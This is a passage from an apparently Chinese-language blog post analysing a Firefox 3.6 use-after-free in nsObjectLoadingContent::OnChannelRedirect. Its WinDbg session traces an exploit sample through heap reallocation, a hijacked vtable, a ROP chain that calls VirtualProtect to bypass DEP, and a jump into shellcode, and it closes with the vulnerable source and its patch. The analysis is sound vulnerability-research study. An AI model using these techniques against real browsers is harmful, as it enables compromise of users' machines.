class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br></pre></td><td class="code"><pre><span class="line">//直接按照书上的下好断点，起始exploit样本里面有OnChannelRedirect函数但是不知道怎么对应</span><br><span class="line">0:000&gt; bl</span><br><span class="line">0 e 7c8623ad     0001 (0001)  0:**** kernel32!WinExec</span><br><span class="line">1 e 107f4e72     0001 (0001)  0:**** xul!nsObjectLoadingContent::LoadObject+0x105</span><br><span class="line">2 e 104623b0     0001 (0001)  0:**** xul!nsObjectLoadingContent::OnChannelRedirect</span><br><span class="line">0:000&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0012ebec 10274b06 032873d8 00000000 03878040 xul!nsObjectLoadingContent::OnChannelRedirect (FPO: [4,0,0]) (CONV: stdcall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsobjectloadingcontent.cpp @ 1017]</span><br><span class="line">0012ec10 1010f422 032873d8 00000003 00000003 xul!NS_InvokeByIndex_P+0x27 (FPO: [Non-Fpo]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\xpcom\reflect\xptcall\src\md\win32\xptcinvoke.cpp @ 103]</span><br><span class="line">0012eea8 10118bf3 0012eed8 00000000 00000000 xul!XPCWrappedNative::CallMethod+0x572 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednative.cpp @ 2722]</span><br><span class="line">0012ef74 00516add 02fb3c00 02e1b700 00000003 xul!XPC_WN_CallMethod+0x173 (FPO: [Uses EBP] [5,44,4]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednativejsops.cpp @ 1740]</span><br><span class="line">0012f028 0051b800 02fb3c00 00000003 0381206c js3250!js_Invoke+0x42d (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1360]</span><br><span class="line">0012f254 004f7195 02fb3c00 0012f304 033f8800 js3250!js_Interpret+0x29a0 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsops.cpp @ 2241]</span><br><span class="line">0012f2d8 004e41d1 015f1a40 033f8800 00000000 js3250!js_Execute+0x1a5 (FPO: [Uses EBP] [4,29,2]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1601]</span><br><span class="line">0012f304 1007f780 02fb3c00 015f1a40 033f0334 js3250!JS_EvaluateUCScriptForPrincipals+0x61 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsapi.cpp @ 5058]</span><br><span class="line">0012f378 1007f57a 0012f44c 015f1a40 033f0330 xul!nsJSContext::EvaluateString+0x158 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\dom\base\nsjsenvironment.cpp @ 1764]</span><br><span class="line">0:000&gt; dd esp</span><br><span class="line">0012ebf0  10274b06 032873d8 00000000 03878040</span><br><span class="line">0012ec00  00000000 008ec880 00000000 0012eea8</span><br><span class="line">0012ec10  0012eea8 1010f422 032873d8 00000003</span><br><span class="line">0012ec20  00000003 0012ecc0 00000000 02e1b7e0</span><br><span class="line">0012ec30  00521c20 0012ec44 0606cc0c 00000000</span><br><span class="line">0012ec40  03fb3c00 00000000 032e6603 0381efb4</span><br><span class="line">0012ec50  008ba070 019a7318 00000003 00000002</span><br><span class="line">0012ec60  00000003 0012ecc0 00000001 03812074</span><br><span class="line">//这里注意windb自动识别的参数有问题（Locals窗口显示的变量和实际不对应），因为是c++函数调用所以OnChannelRedirect函数在汇编层应该是4个参数，第一个参数应该是this指针</span><br><span class="line">//所以参数对应为this 032873d8,*aOldChannel=0，*aNewChannel=03878040，aFlags=00000000 </span><br><span class="line">0:000&gt; dt nsObjectLoadingContent 032873d8 </span><br><span class="line">xul!nsObjectLoadingContent</span><br><span class="line">   +0x000 __VFN_table : 0x109e11cc </span><br><span class="line">   +0x004 mCurrentRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x008 mPendingRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x00c mCurrentURI      : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x010 mObserverList    : nsImageLoadingContent::ImageObserver</span><br><span class="line">   +0x018 mForcedImageState : 0n1</span><br><span class="line">   +0x01c mImageBlockingStatus : 0n0  //mChannel起始是这里这个(开始是0)，不是+0x050 mChannel 不知道为什么.... </span><br><span class="line">   +0x01e mLoadingEnabled  : 0y0</span><br><span class="line">   +0x01e mStartingLoad    : 0y0</span><br><span class="line">   +0x01e mIsImageStateForced : 0y0</span><br><span class="line">   +0x01e mLoading         : 0y0</span><br><span class="line">   +0x01e mBroken          : 0y0</span><br><span class="line">   +0x01e mUserDisabled    : 0y0</span><br><span class="line">   +0x01e mSuppressed      : 0y0</span><br><span class="line">   +0x020 __VFN_table : (null) </span><br><span class="line">   +0x024 __VFN_table : (null) </span><br><span class="line">   +0x028 __VFN_table : 0x02d00000 </span><br><span class="line">   +0x02c __VFN_table : 0x00000004 </span><br><span class="line">   +0x030 __VFN_table : 0x109e11e0 </span><br><span class="line">   +0x034 __VFN_table : 0x109e1348 </span><br><span class="line">   +0x038 mFinalListener   : nsCOMPtr&lt;nsIStreamListener&gt;</span><br><span class="line">   +0x03c mFrameLoader     : nsRefPtr&lt;nsFrameLoader&gt;</span><br><span class="line">   +0x040 mPendingInstantiateEvent : (null) </span><br><span class="line">   +0x044 mContentType     : nsCString</span><br><span class="line">   +0x050 mChannel         : 0x033b1130 nsIChannel</span><br><span class="line">   +0x054 mURI             : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x058 mClassifier      : nsCOMPtr&lt;nsIChannelClassifier&gt;</span><br><span class="line">   +0x05c mType            : 0y00000000000001015 (No matching name)</span><br><span class="line"></span><br><span class="line">   +0x05c mInstantiating   : 0y0</span><br><span class="line">   +0x05c mUserDisabled    : 0y0</span><br><span class="line">   +0x05c mSuppressed      : 0y0</span><br><span class="line">   +0x060 mFallbackReason  : 0x386e220 (No matching name)</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000000 ebx=0012eed8 ecx=00000000 edx=109e11cc esi=032873d8 edi=00000002</span><br><span class="line">eip=104623c8 esp=0012ebec ebp=0012ec10 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">xul!nsObjectLoadingContent::OnChannelRedirect+0x18:</span><br><span class="line">104623c8 85c0            test    eax,eax</span><br><span class="line">//对新的mChannel下硬件写入断点</span><br><span class="line">0:000&gt; ba w 4 03878040</span><br><span class="line">0:000&gt; ? esi+1ch</span><br><span class="line">Evaluate expression: 52982772 = 032873f4</span><br><span class="line">0:000&gt; bl</span><br><span class="line"> 0 e 7c8623ad     0001 (0001)  0:**** kernel32!WinExec</span><br><span class="line"> 1 e 107f4e72     0001 (0001)  0:**** xul!nsObjectLoadingContent::LoadObject+0x105</span><br><span class="line"> 2 e 104623b0     0001 (0001)  0:**** xul!nsObjectLoadingContent::OnChannelRedirect</span><br><span class="line"> 4 e 03878040 w 4 0001 (0001)  0:**** </span><br><span class="line"></span><br><span class="line">// if (mClassifier) &#123;</span><br><span class="line">//    mClassifier-&gt;OnRedirect(aOldChannel, aNewChannel);</span><br><span class="line">//  &#125;</span><br><span class="line">//  mChannel = aNewChannel;</span><br><span class="line">//  return NS_OK;</span><br><span class="line">0:000&gt; dt nsObjectLoadingContent 032873d8 </span><br><span class="line">xul!nsObjectLoadingContent</span><br><span class="line">   +0x000 __VFN_table : 0x109e11cc </span><br><span class="line">   +0x004 mCurrentRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x008 mPendingRequest  : nsCOMPtr&lt;imgIRequest&gt;</span><br><span class="line">   +0x00c mCurrentURI      : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x010 mObserverList    : nsImageLoadingContent::ImageObserver</span><br><span class="line">   +0x018 mForcedImageState : 0n1</span><br><span class="line">   +0x01c mImageBlockingStatus : 0n-32704 //这里已经变成aNewChannel的值了</span><br><span class="line">   +0x01e mLoadingEnabled  : 0y1</span><br><span class="line">   +0x01e mStartingLoad    : 0y1</span><br><span class="line">   +0x01e mIsImageStateForced : 0y1</span><br><span class="line">   +0x01e mLoading         : 0y0</span><br><span class="line">   +0x01e mBroken          : 0y0</span><br><span class="line">   +0x01e mUserDisabled    : 0y0</span><br><span class="line">   +0x01e mSuppressed      : 0y0</span><br><span class="line">   +0x020 __VFN_table : (null) </span><br><span class="line">   +0x024 __VFN_table : (null) </span><br><span class="line">   +0x028 __VFN_table : 0x02d00000 </span><br><span class="line">   +0x02c __VFN_table : 0x00000004 </span><br><span class="line">   +0x030 __VFN_table : 0x109e11e0 </span><br><span class="line">   +0x034 __VFN_table : 0x109e1348 </span><br><span class="line">   +0x038 mFinalListener   : nsCOMPtr&lt;nsIStreamListener&gt;</span><br><span class="line">   +0x03c mFrameLoader     : nsRefPtr&lt;nsFrameLoader&gt;</span><br><span class="line">   +0x040 mPendingInstantiateEvent : (null) </span><br><span class="line">   +0x044 mContentType     : nsCString</span><br><span class="line">   +0x050 mChannel         : 0x033b1130 nsIChannel</span><br><span class="line">   +0x054 mURI             : nsCOMPtr&lt;nsIURI&gt;</span><br><span class="line">   +0x058 mClassifier      : nsCOMPtr&lt;nsIChannelClassifier&gt;</span><br><span class="line">   +0x05c mType            : 0y00000000000001015 (No matching name)</span><br><span class="line"></span><br><span class="line">   +0x05c mInstantiating   : 0y0</span><br><span class="line">   +0x05c mUserDisabled    : 0y0</span><br><span class="line">   +0x05c mSuppressed      : 0y0</span><br><span class="line">   +0x060 mFallbackReason  : 0x386e220 (No matching name)</span><br><span class="line">//这里已经+0x01c mImageBlockingStatus : 0n-32704 已经变成aNewChannel</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 4 hit</span><br><span class="line">eax=03878040 ebx=0082416c ecx=03877be0 edx=006d0040 esi=0012ec24 edi=02e1da00</span><br><span class="line">eip=101389fa esp=0012ec08 ebp=00890260 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">xul!nsXPCWrappedJS::Release+0x18a:</span><br><span class="line">101389fa e897761b00      call    xul!operator delete (102f0096)</span><br><span class="line">//这里在回收mChannel的对象，然后mChannel就称为了悬挂指针</span><br><span class="line">0:000&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0012ec1c 1010fd7b 008b3cd0 00000000 02e1b7e0 xul!nsXPCWrappedJS::Release+0x18a (FPO: [Uses EBP] [1,1,0]) (CONV: stdcall) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappedjs.cpp @ 240]</span><br><span class="line">0012eea8 10118bf3 0012eed8 00000000 00000000 xul!XPCWrappedNative::CallMethod+0xecb (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednative.cpp @ 2895]</span><br><span class="line">0012ef74 00516add 02fb3c00 02e1b700 00000003 xul!XPC_WN_CallMethod+0x173 (FPO: [Uses EBP] [5,44,4]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\xpconnect\src\xpcwrappednativejsops.cpp @ 1740]</span><br><span class="line">0012f028 0051b800 02fb3c00 00000003 0381206c js3250!js_Invoke+0x42d (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1360]</span><br><span class="line">0012f254 004f7195 02fb3c00 0012f304 033f8800 js3250!js_Interpret+0x29a0 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsops.cpp @ 2241]</span><br><span class="line">0012f2d8 004e41d1 015f1a40 033f8800 00000000 js3250!js_Execute+0x1a5 (FPO: [Uses EBP] [4,29,2]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1601]</span><br><span class="line">0012f304 1007f780 02fb3c00 015f1a40 033f0334 js3250!JS_EvaluateUCScriptForPrincipals+0x61 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsapi.cpp @ 5058]</span><br><span class="line">0012f378 1007f57a 0012f44c 015f1a40 033f0330 xul!nsJSContext::EvaluateString+0x158 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\dom\base\nsjsenvironment.cpp @ 1764]</span><br><span class="line">0012f430 10015587 038778b0 0012f44c 015f0fd0 xul!nsScriptLoader::EvaluateScript+0x18f (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 711]</span><br><span class="line">0012f4e4 10072b18 015f0fd0 015f0fd0 02e1d5a4 xul!nsScriptLoader::ProcessRequest+0x6f (FPO: [1,38,0]) (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 625]</span><br><span class="line">0012f880 101a7d9f 02e1d5a4 02e1d5a4 033f4000 xul!nsScriptLoader::ProcessScriptElement+0x2e8 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 577]</span><br><span class="line">0012f89c 10015432 033f40bc 033f4000 02e1d580 xul!nsScriptElement::MaybeProcessScript+0x88 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptelement.cpp @ 193]</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 4 hit</span><br><span class="line">eax=03878040 ebx=00000001 ecx=00000000 edx=00000290 esi=00000000 edi=0381ef60</span><br><span class="line">eip=005becee esp=0012eff8 ebp=0012f02c iopl=0         nv up ei ng nz ac pe cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000297</span><br><span class="line">js3250!str_unescape+0x2f8:</span><br><span class="line">005becee 0f82dffdffff    jb      js3250!str_unescape+0xdd (005bead3)     [br=1]</span><br><span class="line">//重新申请刚释放的位置内存，并写入地址shellcode</span><br><span class="line">0:000&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0012f02c 00519f08 02fb3c00 00000001 03812070 js3250!str_unescape+0x330 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsstr.cpp @ 507]</span><br><span class="line">0012f254 004f7195 02fb3c00 0012f304 033f8800 js3250!js_Interpret+0x10a8 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsops.cpp @ 2208]</span><br><span class="line">0012f2d8 004e41d1 015f1a40 033f8800 00000000 js3250!js_Execute+0x1a5 (FPO: [Uses EBP] [4,29,2]) (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsinterp.cpp @ 1601]</span><br><span class="line">0012f304 1007f780 02fb3c00 015f1a40 033f0334 js3250!JS_EvaluateUCScriptForPrincipals+0x61 (CONV: cdecl) [e:\builds\moz2_slave\rel-192-w32-bld\build\js\src\jsapi.cpp @ 5058]</span><br><span class="line">0012f378 1007f57a 0012f44c 015f1a40 033f0330 xul!nsJSContext::EvaluateString+0x158 (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\dom\base\nsjsenvironment.cpp @ 1764]</span><br><span class="line">0012f430 10015587 038778b0 0012f44c 015f0fd0 xul!nsScriptLoader::EvaluateScript+0x18f (CONV: thiscall) [e:\builds\moz2_slave\rel-192-w32-bld\build\content\base\src\nsscriptloader.cpp @ 711]</span><br><span class="line">//这里mChannel指向的虚函数表地址已经被改变。变成了0x0c000000一个堆地址</span><br><span class="line">0:000&gt; dd 03878040</span><br><span class="line">03878040  0c000000 02e10000 03879d20 03879e70</span><br><span class="line">03878050  10a676bc 033f00b0 00814330 00000002</span><br><span class="line">03878060  10a67278 0386ee00 008b9db8 ecb2ddc2</span><br><span class="line">0:000&gt; !address 0c000000                                     </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  Free</span><br><span class="line">Base Address:           03900000</span><br><span class="line">End Address:            10000000</span><br><span class="line">Region Size:            0c700000</span><br><span class="line">Type:                   00000000	</span><br><span class="line">State:                  00010000	MEM_FREE</span><br><span class="line">Protect:                00000001	PAGE_NOACCESS</span><br><span class="line">//这里ecx为虚函数表地址，ecx+18h为虚函数地址指针，[ecx+18h]为虚函数地址</span><br><span class="line">0:000&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">eax=03878040 ebx=032873a4 ecx=0c000000 edx=015f0f40 esi=804b0002 edi=80000000</span><br><span class="line">eip=107f4e72 esp=0012f638 ebp=0012f844 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">xul!nsObjectLoadingContent::LoadObject+0x105:</span><br><span class="line">107f4e72 ff5118          call    dword ptr [ecx+18h]  ds:0023:0c000018=1052c871</span><br><span class="line">107f4e70 56              push    esi</span><br><span class="line">107f4e71 50              push    eax</span><br><span class="line">107f4e72 ff5118          call    dword ptr [ecx+18h]  ds:0023:0c000018=1052c871     //这里跳转到shellcode处</span><br><span class="line">107f4e75 8d4b38          lea     ecx,[ebx+38h]</span><br><span class="line">107f4e78 e8e4d3afff      call    xul!nsCOMPtr&lt;nsIStreamListener&gt;::operator nsIStreamListener * (102f2261)</span><br><span class="line">107f4e7d 85c0            test    eax,eax</span><br><span class="line">0:000&gt; ? ecx+18h</span><br><span class="line">Evaluate expression: 201326616 = 0c000018</span><br><span class="line">0:000&gt; dd 0c000018</span><br><span class="line">0c000018  1052c871 73644969 7c801ad4 735a4f5a</span><br><span class="line">0c000028  69646658 1003876b 0c000040 00000400</span><br><span class="line">0c000038  00000040 0c0c0c00 93d6f997 42904f97</span><br><span class="line">0c000048  274f4341 46fc9f2f 99903f98 9f969842</span><br><span class="line">0c000058  37d6f541 9746434a 98f54b48 f84bf598</span><br><span class="line">0c000068  964a4a99 49489698 d6489341 4b4ffc9f</span><br><span class="line">0c000078  9b3797f8 d6fcd637 90484799 4e4af99f</span><br><span class="line">0c000088  904327fd 402f2f98 979b4141 91499847</span><br><span class="line">//这里应该是传说中的ROP链</span><br><span class="line">0:000&gt; u 1052c871 </span><br><span class="line">xul!nsHttpHandler::SetVendorComment+0x10 [e:\builds\moz2_slave\rel-192-w32-bld\build\netwerk\protocol\http\src\nshttphandler.cpp @ 1612]:</span><br><span class="line">1052c871 8b21            mov     esp,dword ptr [ecx]       //[ecx=0c000000]=0c00001c,修改堆栈指针esp为0c00001c</span><br><span class="line">1052c873 baffc6865c      mov     edx,5C86C6FFh</span><br><span class="line">1052c878 0100            add     dword ptr [eax],eax</span><br><span class="line">1052c87a 0001            add     byte ptr [ecx],al</span><br><span class="line">1052c87c 33c0            xor     eax,eax</span><br><span class="line">1052c87e 5e              pop     esi</span><br><span class="line">1052c87f c20800          ret     8</span><br><span class="line">0:000&gt; dd esp                                       </span><br><span class="line">0c00001c  73644969 7c801ad4 735a4f5a 69646658</span><br><span class="line">0c00002c  1003876b 0c000040 00000400 00000040</span><br><span class="line">0c00003c  0c0c0c00 93d6f997 42904f97 274f4341</span><br><span class="line">0c00004c  46fc9f2f 99903f98 9f969842 37d6f541</span><br><span class="line">0c00005c  9746434a 98f54b48 f84bf598 964a4a99</span><br><span class="line">0c00006c  49489698 d6489341 4b4ffc9f 9b3797f8</span><br><span class="line">0c00007c  d6fcd637 90484799 4e4af99f 904327fd</span><br><span class="line">0c00008c  402f2f98 979b4141 91499847 92fd914f</span><br><span class="line">//7c801ad4是xul!nsHttpHandler::SetVendorComment+0x10函数的返回地址，当ret 8后直接进入函数VirtualProtect</span><br><span class="line">0:000&gt; u 7c801ad4</span><br><span class="line">kernel32!VirtualProtect:</span><br><span class="line">7c801ad4 8bff            mov     edi,edi</span><br><span class="line">7c801ad6 55              push    ebp</span><br><span class="line">7c801ad7 8bec            mov     ebp,esp</span><br><span class="line">7c801ad9 ff7514          push    dword ptr [ebp+14h]</span><br><span class="line">7c801adc ff7510          push    dword ptr [ebp+10h]</span><br><span class="line">7c801adf ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">7c801ae2 ff7508          push    dword ptr [ebp+8]</span><br><span class="line">7c801ae5 6aff            push    0FFFFFFFFh</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000000 ebx=0338a764 ecx=0c000000 edx=5c86c6ff esi=73644969 edi=80000000</span><br><span class="line">eip=1052c87f esp=0c000020 ebp=0012eaa4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">xul!nsHttpHandler::SetVendorComment+0x1e:</span><br><span class="line">1052c87f c20800          ret     8</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000000 ebx=0338a764 ecx=0c000000 edx=5c86c6ff esi=73644969 edi=80000000</span><br><span class="line">eip=7c801ad4 esp=0c00002c ebp=0012eaa4 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">kernel32!VirtualProtect:</span><br><span class="line">7c801ad4 8bff            mov     edi,edi</span><br><span class="line">//1003876b是VirtualProtect的返回地址，后面是VirtualProtect的参数</span><br><span class="line">0:000&gt; dd esp</span><br><span class="line">0c00002c  1003876b 0c000040 00000400 00000040</span><br><span class="line">0c00003c  0c0c0c00 93d6f997 42904f97 274f4341</span><br><span class="line">0c00004c  46fc9f2f 99903f98 9f969842 37d6f541</span><br><span class="line">0c00005c  9746434a 98f54b48 f84bf598 964a4a99</span><br><span class="line">0c00006c  49489698 d6489341 4b4ffc9f 9b3797f8</span><br><span class="line">0c00007c  d6fcd637 90484799 4e4af99f 904327fd</span><br><span class="line">0c00008c  402f2f98 979b4141 91499847 92fd914f</span><br><span class="line">0c00009c  913f9846 984746f8 41404bfc f541f596</span><br><span class="line">/*</span><br><span class="line">BOOL VirtualProtect(  </span><br><span class="line">  LPVOID lpAddress,       // region of committed pages     0c000040</span><br><span class="line">  SIZE_T dwSize,          // size of the region            00000400  </span><br><span class="line">  DWORD flNewProtect,     // desired access protection     00000040 </span><br><span class="line">  PDWORD lpflOldProtect   // old protection);              0c0c0c00            </span><br><span class="line"> */</span><br><span class="line">kernel32!VirtualProtect:</span><br><span class="line">7c801ad4 8bff            mov     edi,edi</span><br><span class="line">7c801ad6 55              push    ebp</span><br><span class="line">7c801ad7 8bec            mov     ebp,esp</span><br><span class="line">7c801ad9 ff7514          push    dword ptr [ebp+14h]  ss:0023:0c00003c=0c0c0c00</span><br><span class="line">7c801adc ff7510          push    dword ptr [ebp+10h]</span><br><span class="line">7c801adf ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">7c801ae2 ff7508          push    dword ptr [ebp+8]</span><br><span class="line">7c801ae5 6aff            push    0FFFFFFFFh</span><br><span class="line">7c801ae7 e875ffffff      call    kernel32!VirtualProtectEx (7c801a61)</span><br><span class="line">7c801aec 5d              pop     ebp</span><br><span class="line">7c801aed c21000          ret     10h</span><br><span class="line">0:000&gt; dd esp+8</span><br><span class="line">0c000030  0c000040 00000400 00000040 0c0c0c00</span><br><span class="line">0c000040  93d6f997 42904f97 274f4341 46fc9f2f</span><br><span class="line">0c000050  99903f98 9f969842 37d6f541 9746434a</span><br><span class="line">0c000060  98f54b48 f84bf598 964a4a99 49489698</span><br><span class="line">0c000070  d6489341 4b4ffc9f 9b3797f8 d6fcd637</span><br><span class="line">0c000080  90484799 4e4af99f 904327fd 402f2f98</span><br><span class="line">0c000090  979b4141 91499847 92fd914f 913f9846</span><br><span class="line">0c0000a0  984746f8 41404bfc f541f596 903f4292</span><br><span class="line">//设置堆属性,过dep</span><br><span class="line">0:000&gt; !address 0c000000                                    </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        0c000000</span><br><span class="line">Base Address:           0c000000</span><br><span class="line">End Address:            0c001000</span><br><span class="line">Region Size:            00001000</span><br><span class="line">Type:                   00020000	MEM_PRIVATE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000040	PAGE_EXECUTE_READWRITE</span><br><span class="line">kernel32!VirtualProtect+0x18:</span><br><span class="line">7c801aec 5d              pop     ebp</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000001 ebx=0338a764 ecx=0bffffe8 edx=7c92e4f4 esi=73644969 edi=80000000</span><br><span class="line">eip=7c801aed esp=0c00002c ebp=0012eaa4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">kernel32!VirtualProtect+0x19:</span><br><span class="line">7c801aed c21000          ret     10h</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000001 ebx=0338a764 ecx=0bffffe8 edx=7c92e4f4 esi=73644969 edi=80000000</span><br><span class="line">eip=1003876b esp=0c000040 ebp=0012eaa4 iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">xul!DetermineParseMode+0x22:</span><br><span class="line">1003876b ffe4            jmp     esp &#123;0c000040&#125;</span><br><span class="line">//跳板指令1003876b，跳入shellcode中执行，开始是一段滑板指令</span><br><span class="line">0:000&gt; !address 0c000000                           </span><br><span class="line">Failed to map Heaps (error 80004005)</span><br><span class="line">Usage:                  &lt;unclassified&gt;</span><br><span class="line">Allocation Base:        0c000000</span><br><span class="line">Base Address:           0c000000</span><br><span class="line">End Address:            0c001000</span><br><span class="line">Region Size:            00001000</span><br><span class="line">Type:                   00020000	MEM_PRIVATE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000040	PAGE_EXECUTE_READWRITE</span><br><span class="line">0:000&gt; u 0c000040</span><br><span class="line">0c000040 97              xchg    eax,edi</span><br><span class="line">0c000041 f9              stc</span><br><span class="line">0c000042 d6              ???</span><br><span class="line">0c000043 93              xchg    eax,ebx</span><br><span class="line">0c000044 97              xchg    eax,edi</span><br><span class="line">0c000045 4f              dec     edi</span><br><span class="line">0c000046 90              nop</span><br><span class="line">0c000047 42              inc     edx</span><br></pre></td></tr></table></figure>
<h3 id="漏洞函数">漏洞函数</h3><ul>
<li>存在问题的函数<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// nsIChannelEventSink</span></span><br><span class="line">NS_IMETHODIMP</span><br><span class="line">nsObjectLoadingContent::OnChannelRedirect(nsIChannel *aOldChannel,</span><br><span class="line">                                          nsIChannel *aNewChannel,</span><br><span class="line">                                          PRUint32    aFlags)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// If we're already busy with a new load, cancel the redirect</span></span><br><span class="line">  <span class="keyword">if</span> (aOldChannel != mChannel) &#123;<span class="comment">//打补丁后，这里变成了if (!mChannel||aOldChannel != mChannel)</span></span><br><span class="line">      <span class="keyword">return</span> NS_BINDING_ABORTED;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mClassifier) &#123;</span><br><span class="line">    mClassifier-&gt;OnRedirect(aOldChannel, aNewChannel);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  mChannel = aNewChannel;</span><br><span class="line">  <span class="keyword">return</span> NS_OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- 